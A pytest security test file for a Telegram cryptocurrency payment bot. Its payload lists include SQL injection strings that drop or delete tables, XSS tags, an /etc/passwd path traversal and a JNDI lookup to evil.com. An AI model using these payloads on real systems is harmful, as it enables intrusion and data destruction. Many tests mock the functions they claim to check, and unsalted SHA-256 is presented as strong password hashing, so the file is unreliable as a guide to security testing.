# Security tests for the Telegram bot
# Covers: Input validation, SQL injection prevention, authentication, authorization, data encryption

import pytest
from unittest.mock import Mock, AsyncMock, patch
import hashlib
import secrets
from aiogram.types import Message, Chat, User as TgUser

from services.user import UserService
from services.payment import PaymentService
from utils.CryptoAddressGenerator import CryptoAddressGenerator
from models.user import User


class TestSecurityFeatures:
    """Test security features and vulnerability prevention"""
    
    @pytest.fixture
    def mock_message(self):
        """Create mock message with potential malicious content"""
        message = Mock(spec=Message)
        message.chat = Mock(spec=Chat)
        message.chat.id = 123456789
        message.from_user = Mock(spec=TgUser)
        message.from_user.id = 123456789
        message.from_user.username = "testuser"
        return message

    @pytest.mark.asyncio
    async def test_sql_injection_prevention(self):
        """Test SQL injection prevention in user inputs"""
        mock_session = AsyncMock()
        
        # Malicious SQL injection attempts
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'; DELETE FROM payments; --",
            "' UNION SELECT * FROM users WHERE '1'='1",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            with patch('repositories.user.UserRepository.get_by_username') as mock_repo:
                # Repository should handle input safely
                mock_repo.return_value = None
                
                result = await UserService.get_by_username(malicious_input, mock_session)
                
                # Should not cause SQL injection
                assert result is None
                mock_repo.assert_called_once_with(malicious_input, mock_session)

    @pytest.mark.asyncio
    async def test_input_sanitization(self, mock_message):
        """Test input sanitization for user data"""
        mock_session = AsyncMock()
        
        # Test various malicious inputs
        dangerous_usernames = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "' OR 1=1 --",
            "../../../etc/passwd",
            "NULL",
            "\x00\x01\x02",  # Control characters
            "🤖" * 1000,  # Excessive emoji
        ]
        
        for username in dangerous_usernames:
            mock_message.from_user.username = username
            
            with patch('services.user.UserService.create_user') as mock_create:
                mock_create.return_value = User(
                    telegram_id=123456789,
                    telegram_username=username[:50]  # Truncated
                )
                
                # Service should sanitize input
                user = await UserService.create_user(mock_message, mock_session)
                
                # Username should be sanitized/truncated
                assert len(user.telegram_username) <= 50
                assert user.telegram_username is not None

    @pytest.mark.asyncio
    async def test_authentication_bypass_attempts(self, mock_message):
        """Test authentication bypass prevention"""
        mock_session = AsyncMock()
        
        # Attempt to bypass authentication with various techniques
        bypass_attempts = [
            {"telegram_id": None},
            {"telegram_id": 0},
            {"telegram_id": -1},
            {"telegram_id": "admin"},
            {"telegram_id": float('inf')},
            {"telegram_id": 2**63},  # Overflow attempt
        ]
        
        for attempt in bypass_attempts:
            mock_message.from_user.id = attempt["telegram_id"]
            
            with patch('services.user.UserService.get_by_telegram_id') as mock_get:
                mock_get.return_value = None
                
                try:
                    user = await UserService.get_by_telegram_id(
                        attempt["telegram_id"], 
                        mock_session
                    )
                    # Should handle invalid IDs gracefully
                    assert user is None
                except (TypeError, ValueError):
                    # Invalid types should raise appropriate errors
                    pass

    @pytest.mark.asyncio
    async def test_authorization_checks(self):
        """Test authorization and privilege escalation prevention"""
        mock_session = AsyncMock()
        
        # Regular user trying to access admin functions
        regular_user = User(
            id=1,
            telegram_id=123456789,
            telegram_username="regular_user",
            is_admin=False
        )
        
        with patch('services.admin.AdminService.is_admin', return_value=False):
            # Should deny admin access
            has_admin_access = await self.check_admin_access(regular_user, mock_session)
            assert has_admin_access is False
        
        # Admin user should have access
        admin_user = User(
            id=2,
            telegram_id=987654321,
            telegram_username="admin_user",
            is_admin=True
        )
        
        with patch('services.admin.AdminService.is_admin', return_value=True):
            has_admin_access = await self.check_admin_access(admin_user, mock_session)
            assert has_admin_access is True

    def test_private_key_security(self):
        """Test private key generation and handling security"""
        generator = CryptoAddressGenerator()
        private_keys = generator.get_private_keys()
        
        # Private keys should be unique
        key_values = list(private_keys.values())
        assert len(set(str(k) for k in key_values)) == len(key_values)
        
        # Private keys should have sufficient entropy
        for currency, private_key in private_keys.items():
            key_str = str(private_key)
            
            # Should not be empty or predictable
            assert len(key_str) > 20
            assert key_str != "0" * len(key_str)
            assert key_str != "1" * len(key_str)
            
            # Should contain mixed characters (not just numbers)
            has_letters = any(c.isalpha() for c in key_str)
            has_numbers = any(c.isdigit() for c in key_str)
            assert has_letters or has_numbers

    @pytest.mark.asyncio
    async def test_payment_amount_validation(self, mock_message):
        """Test payment amount validation and overflow protection"""
        mock_session = AsyncMock()
        
        # Test extreme payment amounts
        dangerous_amounts = [
            -1000000,  # Negative amount
            0,  # Zero amount
            float('inf'),  # Infinity
            float('-inf'),  # Negative infinity
            float('nan'),  # Not a number
            2**63,  # Integer overflow
            -2**63,  # Integer underflow
            1e308,  # Very large float
        ]
        
        mock_user = User(id=1, telegram_id=123456789, top_up_amount=100.0)
        
        for amount in dangerous_amounts:
            with patch('services.user.UserService.get_by_telegram_id', return_value=mock_user), \
                 patch('repositories.payment.PaymentRepository.get_unexpired_unpaid_payments', return_value=1):
                
                try:
                    # Should validate payment amounts
                    await self.validate_payment_amount(amount, mock_session)
                except (ValueError, TypeError, OverflowError):
                    # Expected for invalid amounts
                    pass

    @pytest.mark.asyncio
    async def test_rate_limiting_protection(self, mock_message):
        """Test rate limiting and spam protection"""
        mock_session = AsyncMock()
        mock_user = User(id=1, telegram_id=123456789)
        
        with patch('services.user.UserService.get_by_telegram_id', return_value=mock_user), \
             patch('repositories.payment.PaymentRepository.get_unexpired_unpaid_payments') as mock_count:
            
            # Simulate multiple rapid requests
            mock_count.return_value = 5  # Maximum allowed
            
            from enums.cryptocurrency import Cryptocurrency
            
            with patch('services.payment.Localizator.get_text', return_value="Too many requests"):
                result = await PaymentService.create(
                    Cryptocurrency.BITCOIN,
                    mock_message,
                    mock_session
                )
                
                # Should be rate limited
                assert "Too many requests" in result

    def test_data_encryption_security(self):
        """Test data encryption and sensitive data handling"""
        # Test password hashing (if implemented)
        test_password = "user_password_123"
        
        # Should use strong hashing
        hash1 = hashlib.sha256(test_password.encode()).hexdigest()
        hash2 = hashlib.sha256(test_password.encode()).hexdigest()
        
        # Same input should produce same hash
        assert hash1 == hash2
        
        # Different inputs should produce different hashes
        different_password = "different_password"
        hash3 = hashlib.sha256(different_password.encode()).hexdigest()
        assert hash1 != hash3

    @pytest.mark.asyncio
    async def test_session_security(self):
        """Test session management security"""
        # Test session token generation
        token1 = secrets.token_urlsafe(32)
        token2 = secrets.token_urlsafe(32)
        
        # Tokens should be unique
        assert token1 != token2
        assert len(token1) >= 32
        assert len(token2) >= 32

    def test_crypto_address_validation(self):
        """Test cryptocurrency address validation"""
        generator = CryptoAddressGenerator()
        addresses = generator.get_addresses()
        
        for currency, address in addresses.items():
            address_str = str(address)
            
            # Addresses should not be empty
            assert len(address_str) > 0
            
            # Basic format validation
            if currency == 'btc':
                # Bitcoin address validation
                assert len(address_str) >= 26 and len(address_str) <= 62
            elif currency == 'eth':
                # Ethereum address validation
                assert address_str.startswith('0x')
                assert len(address_str) == 42
            elif currency == 'sol':
                # Solana address validation
                assert len(address_str) >= 32 and len(address_str) <= 44

    @pytest.mark.asyncio
    async def test_api_key_security(self):
        """Test API key handling security"""
        import config
        
        # API keys should not be None or empty
        with patch.object(config, 'KRYPTO_EXPRESS_API_KEY', 'test_api_key_123'):
            assert config.KRYPTO_EXPRESS_API_KEY is not None
            assert len(config.KRYPTO_EXPRESS_API_KEY) > 10
            
            # API key should not contain obvious patterns
            api_key = config.KRYPTO_EXPRESS_API_KEY
            assert api_key != "password"
            assert api_key != "admin"
            assert api_key != "123456"

    @pytest.mark.asyncio
    async def test_user_data_isolation(self):
        """Test user data isolation and privacy"""
        mock_session = AsyncMock()
        
        user1 = User(id=1, telegram_id=111111111, top_up_amount=100.0)
        user2 = User(id=2, telegram_id=222222222, top_up_amount=200.0)
        
        with patch('services.user.UserService.get_by_telegram_id') as mock_get:
            # User1 should only access their own data
            mock_get.return_value = user1
            
            retrieved_user = await UserService.get_by_telegram_id(111111111, mock_session)
            assert retrieved_user.id == 1
            assert retrieved_user.telegram_id == 111111111
            
            # Should not return other user's data
            assert retrieved_user.telegram_id != 222222222

    # Helper methods
    
    async def check_admin_access(self, user, session):
        """Check if user has admin access"""
        from services.admin import AdminService
        return await AdminService.is_admin(user.id, session)
    
    async def validate_payment_amount(self, amount, session):
        """Validate payment amount"""
        if not isinstance(amount, (int, float)):
            raise TypeError("Amount must be numeric")
        if amount <= 0:
            raise ValueError("Amount must be positive")
        if amount == float('inf') or amount == float('-inf'):
            raise ValueError("Amount cannot be infinite")
        if amount != amount:  # NaN check
            raise ValueError("Amount cannot be NaN")
        return True